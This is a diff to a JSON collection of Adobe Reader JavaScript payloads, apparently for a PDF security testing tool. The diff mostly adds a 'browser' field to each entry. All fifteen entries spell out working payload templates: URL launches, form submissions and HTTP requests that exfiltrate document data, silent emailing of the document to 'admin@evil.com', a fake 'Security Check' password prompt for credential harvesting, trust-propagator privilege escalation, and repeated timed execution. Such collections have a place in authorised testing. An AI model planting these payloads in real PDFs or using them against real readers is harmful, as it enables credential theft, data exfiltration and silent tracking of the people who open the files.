@@ -7,7 +7,7 @@
     "categories": [
       "api_abuse",
       "file_system",
-      "network_exfiltration", 
+      "network_exfiltration",
       "privilege_escalation"
     ],
     "cve_references": [
@@ -24,7 +24,8 @@
       "technique": "basic_launch_url",
       "payload": "app.launchURL('{url}', true);",
       "description": "Adobe Reader basic URL launch with trusted execution",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_002",
@@ -32,7 +33,8 @@
       "technique": "form_submission",
       "payload": "this.submitForm({cURL: '{url}', cSubmitAs: 'HTML'});",
       "description": "Adobe Reader form submission to external URL as HTML",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_003",
@@ -40,7 +42,8 @@
       "technique": "user_response_dialog",
       "payload": "app.response({cQuestion: 'Enter password:', cTitle: 'Security Check', bPassword: true, cResponse: '{url}'});",
       "description": "Adobe Reader credential harvesting via response dialog",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "adobe"
     },
     {
       "id": "adobe_004",
@@ -48,7 +51,8 @@
       "technique": "export_as_text",
       "payload": "this.exportAsText({cPath: '{url}'});",
       "description": "Adobe Reader text export to external URL for data exfiltration",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_005",
@@ -56,7 +60,8 @@
       "technique": "save_as_operation",
       "payload": "this.saveAs({cPath: '{url}'});",
       "description": "Adobe Reader save operation to external URL",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_006",
@@ -64,7 +69,8 @@
       "technique": "browse_for_doc",
       "payload": "app.browseForDoc({bSave: true, cFilenameEdit: '{url}'});",
       "description": "Adobe Reader file browser manipulation for data access",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_007",
@@ -72,7 +78,8 @@
       "technique": "silent_print",
       "payload": "this.print({bUI: false, bSilent: true, bShrinkToFit: true, cPath: '{url}'});",
       "description": "Adobe Reader silent print operation to external URL",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_008",
@@ -80,7 +87,8 @@
       "technique": "http_request",
       "payload": "Net.HTTP.request({cURL: '{url}', cMethod: 'POST', cParams: document.URL});",
       "description": "Adobe Reader HTTP request with document URL exfiltration",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_009",
@@ -88,7 +96,8 @@
       "technique": "http_response_handler",
       "payload": "Net.HTTP.request({cURL: '{url}', oHandler: {response: function(msg) {app.alert(msg);}}});",
       "description": "Adobe Reader HTTP request with response handler",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_010",
@@ -96,7 +105,8 @@
       "technique": "email_document",
       "payload": "this.mailDoc({bUI: false, cTo: 'admin@evil.com', cSubject: 'PDF Exploit', cMsg: '{url}'});",
       "description": "Adobe Reader automatic email document to attacker",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_011",
@@ -104,7 +114,8 @@
       "technique": "file_stream_read",
       "payload": "util.readFileIntoStream('{url}');",
       "description": "Adobe Reader file stream reading from external URL",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_012",
@@ -112,7 +123,8 @@
       "technique": "document_url_access",
       "payload": "this.getURL('{url}');",
       "description": "Adobe Reader document URL access for navigation",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "adobe"
     },
     {
       "id": "adobe_013",
@@ -120,7 +132,8 @@
       "technique": "import_data_object",
       "payload": "this.importDataObject('{url}');",
       "description": "Adobe Reader data object import from external URL",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     },
     {
       "id": "adobe_014",
@@ -128,7 +141,8 @@
       "technique": "trust_propagator",
       "payload": "app.trustPropagatorFunction(function() {app.launchURL('{url}');});",
       "description": "Adobe Reader privilege escalation via trust propagator",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "adobe"
     },
     {
       "id": "adobe_015",
@@ -136,7 +150,8 @@
       "technique": "timed_execution",
       "payload": "app.setInterval('app.launchURL(\\'{url}\\')', 5000);",
       "description": "Adobe Reader persistent timed execution every 5 seconds",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "adobe"
     }
   ]
 }
